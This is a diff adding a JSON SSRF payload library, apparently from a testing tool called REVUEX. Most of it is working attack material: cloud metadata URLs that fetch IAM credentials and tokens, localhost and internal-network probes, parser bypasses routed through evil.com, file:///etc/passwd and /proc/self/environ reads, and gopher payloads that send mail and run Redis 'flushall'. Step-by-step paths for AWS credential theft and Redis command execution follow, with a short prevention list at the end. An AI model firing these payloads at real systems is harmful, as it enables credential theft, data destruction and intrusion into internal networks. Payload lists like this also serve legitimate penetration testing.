@@ -1,0 +1,189 @@
+{
+  "description": "REVUEX SSRF Payload Library",
+  "version": "2.0",
+  "payloads": {
+    "cloud_metadata": {
+      "aws": [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.169.254/latest/user-data/",
+        "http://169.254.169.254/latest/dynamic/instance-identity/",
+        "http://instance-data/latest/meta-data/"
+      ],
+      "gcp": [
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "http://metadata/computeMetadata/v1/",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+      ],
+      "azure": [
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+      ],
+      "alibaba": [
+        "http://100.100.100.200/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/instance-id"
+      ],
+      "digitalocean": [
+        "http://169.254.169.254/metadata/v1.json",
+        "http://169.254.169.254/metadata/v1/id"
+      ]
+    },
+    "internal_networks": {
+      "rfc1918": [
+        "http://10.0.0.1/",
+        "http://10.0.0.5/",
+        "http://192.168.0.1/",
+        "http://192.168.1.1/",
+        "http://172.16.0.1/"
+      ],
+      "localhost": [
+        "http://127.0.0.1/",
+        "http://127.0.0.1:80/",
+        "http://127.0.0.1:8080/",
+        "http://127.1/",
+        "http://0.0.0.0/",
+        "http://localhost/"
+      ]
+    },
+    "url_parser_bypass": {
+      "url_confusion": [
+        "http://127.0.0.1@evil.com/",
+        "http://evil.com#@127.0.0.1/",
+        "http://127.0.0.1%2f@evil.com/",
+        "http://127.0.0.1%09@evil.com/"
+      ],
+      "ipv6": [
+        "http://[::1]/",
+        "http://[0:0:0:0:0:0:0:1]/",
+        "http://[::ffff:127.0.0.1]/"
+      ],
+      "decimal_ip": [
+        "http://2130706433/",
+        "http://0x7f000001/",
+        "http://017700000001/"
+      ],
+      "dns_rebinding": [
+        "http://127.0.0.1.nip.io/",
+        "http://127.0.0.1.xip.io/",
+        "http://spoofed.burpcollaborator.net/"
+      ]
+    },
+    "protocol_smuggling": {
+      "file": [
+        "file:///etc/passwd",
+        "file:///c:/windows/win.ini",
+        "file:///proc/self/environ"
+      ],
+      "gopher": [
+        "gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:<%3E%0ARCPT%20TO:<admin@localhost>%0ADATA%0ASubject:%20SSRF%0A%0ATest%0A.%0AQUIT%0A",
+        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+      ],
+      "dict": [
+        "dict://127.0.0.1:6379/info",
+        "dict://127.0.0.1:11211/stats"
+      ],
+      "sftp": [
+        "sftp://127.0.0.1:22/"
+      ],
+      "tftp": [
+        "tftp://127.0.0.1:69/file"
+      ]
+    },
+    "port_scanning": {
+      "common_ports": [
+        "http://127.0.0.1:22/",
+        "http://127.0.0.1:23/",
+        "http://127.0.0.1:25/",
+        "http://127.0.0.1:80/",
+        "http://127.0.0.1:443/",
+        "http://127.0.0.1:3306/",
+        "http://127.0.0.1:5432/",
+        "http://127.0.0.1:6379/",
+        "http://127.0.0.1:8080/",
+        "http://127.0.0.1:9200/"
+      ]
+    },
+    "encoding_bypass": {
+      "url_encoding": [
+        "http://127.0.0.1%2f",
+        "http://%31%32%37%2e%30%2e%30%2e%31/",
+        "http://127.0.0.1%23@evil.com/"
+      ],
+      "double_encoding": [
+        "http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31/"
+      ]
+    }
+  },
+  "detection": {
+    "timing_based": [
+      "Check response time for internal vs external",
+      "Timeout indicates filtered port",
+      "Fast response indicates open port"
+    ],
+    "response_based": [
+      "Different response for internal IPs",
+      "Error messages reveal internal structure",
+      "Cloud metadata contains credentials"
+    ]
+  },
+  "exploitation_paths": {
+    "aws_credential_theft": [
+      "1. Access http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "2. Get role name",
+      "3. Access http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]",
+      "4. Retrieve AWS credentials (AccessKeyId, SecretAccessKey, Token)",
+      "5. Use credentials with AWS CLI",
+      "6. Access S3 buckets, EC2 instances, etc."
+    ],
+    "internal_service_access": [
+      "1. Scan internal network (10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12)",
+      "2. Identify services (Redis, Elasticsearch, MongoDB)",
+      "3. Access internal APIs",
+      "4. Read sensitive data",
+      "5. Execute commands via Redis/Memcached"
+    ],
+    "port_scanning": [
+      "1. Test common ports on localhost",
+      "2. Identify running services",
+      "3. Access admin panels",
+      "4. Exploit unpatched services"
+    ]
+  },
+  "prevention": {
+    "best_practices": [
+      "Validate URL scheme (allow only http/https)",
+      "Block private IP ranges (RFC1918)",
+      "Block cloud metadata IPs (169.254.169.254)",
+      "Use allowlist for domains",
+      "Disable unnecessary protocols (file://, gopher://)",
+      "Network segmentation",
+      "Use WAF rules",
+      "Implement request signing",
+      "Add SSRF protection library"
+    ]
+  },
+  "real_world_examples": [
+    {
+      "company": "Capital One",
+      "year": 2019,
+      "impact": "100M+ records stolen",
+      "vulnerability": "SSRF to AWS metadata",
+      "bounty": "N/A (breach)"
+    },
+    {
+      "company": "Microsoft",
+      "year": 2021,
+      "bounty": "$40,000",
+      "vulnerability": "SSRF in Azure",
+      "technique": "Cloud metadata access"
+    },
+    {
+      "company": "Alibaba",
+      "year": 2020,
+      "bounty": "$25,000",
+      "vulnerability": "SSRF to internal services",
+      "result": "Internal network access"
+    }
+  ]
+}
